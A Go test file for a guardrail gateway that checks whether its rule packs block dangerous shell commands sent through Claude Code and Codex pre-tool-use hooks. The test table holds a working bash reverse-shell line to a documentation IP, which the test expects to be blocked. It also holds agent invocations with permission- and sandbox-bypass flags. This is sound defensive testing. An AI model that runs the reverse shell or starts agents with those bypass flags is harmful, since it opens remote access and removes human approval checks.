//go:build !windows

package gateway

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"slices"
	"testing"

	"github.com/defenseclaw/defenseclaw/internal/hookpaths"
)

// TestRulePackDocumentedFactsHold is rel-1-0-10:GAP-0178: the facts
// docs/GUARDRAIL_RULE_PACKS.md names for CMD-REVSHELL-DEVTCP,
// CMD-REVSHELL-BASH and exec.agent_runtime_bypass_flags hold in every tier.
// A reverse shell ties the shell's input and output to the socket and
// blocks; a one-way write to /dev/tcp is no reverse shell. An agent run with
// a bypass flag blocks; a version print of the agent starts no session.
func TestRulePackDocumentedFactsHold(t *testing.T) {
	home := filepath.Join(t.TempDir(), "home", "alice")
	project := filepath.Join(home, "proj")
	if err := os.MkdirAll(project, 0o700); err != nil {
		t.Fatal(err)
	}
	t.Setenv("HOME", home)
	rows := []struct {
		id, command, rule string
		block             bool
	}{
		{"revshell", `bash -i >& /dev/tcp/203.0.113.7/4444 0>&1`, "CMD-REVSHELL-DEVTCP", true},
		{"devtcp-one-way", `bash -i -c 'echo probe > /dev/tcp/203.0.113.7/9'`, "", false},
		{"devtcp-one-way-loopback", `bash -i -c 'echo probe > /dev/tcp/127.0.0.1/9'`, "", false},
		{"bypass-run", `claude --dangerously-skip-permissions -p "fix the tests"`, "exec.agent_runtime_bypass_flags", true},
		{"bypass-codex-run", `codex --dangerously-bypass-approvals-and-sandbox exec "fix"`, "exec.agent_runtime_bypass_flags", true},
		{"bypass-version", `claude --dangerously-skip-permissions --version > /var/tmp/x/bypass.txt`, "", false},
	}
	for _, pack := range gap0437Packs {
		for _, connector := range []string{"claudecode", "codex"} {
			a := gap0437Server(t, pack, connector, "action")
			for index, r := range rows {
				out := g0178Hook(t, a, connector, project, fmt.Sprintf("g0178-%s-%s-%d", pack.name, connector, index), r.command)
				action, severity, rules := g0432Verdict(out)
				name := pack.name + "/" + connector + "/" + r.id
				t.Logf("ROW %s %s/%s/%v", name, action, severity, rules)
				if r.block && (action != "block" || !slices.Contains(rules, r.rule)) {
					t.Errorf("%s: answered %s %s %v, want a block on %s", name, action, severity, rules, r.rule)
				}
				if !r.block && (action != "allow" || len(rules) != 0) {
					t.Errorf("%s: answered %s %s %v, want allow with no finding", name, action, severity, rules)
				}
			}
		}
	}
}

func g0178Hook(t *testing.T, a *APIServer, connector, cwd, id, command string) map[string]any {
	t.Helper()
	if connector == "claudecode" {
		return gap0437Hook(t, a, cwd, id, command)
	}
	body, _ := json.Marshal(map[string]any{
		"hook_event_name": "PreToolUse", "session_id": id, "cwd": cwd,
		"tool_name": "Bash", "tool_use_id": "tu-" + id, "tool_input": map[string]any{"command": command},
	})
	req := httptest.NewRequest(http.MethodPost, "/api/v1/codex/hook", bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set(hookpaths.Header, hookpaths.Resolve(body))
	setTestCodexHookBinding(req, "PreToolUse", defaultTestCodexHookContract)
	w := httptest.NewRecorder()
	a.handleAgentHook("codex").ServeHTTP(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("%s: status %d body %s", id, w.Code, w.Body.String())
	}
	var out map[string]any
	if err := json.Unmarshal(w.Body.Bytes(), &out); err != nil {
		t.Fatal(err)
	}
	return out
}
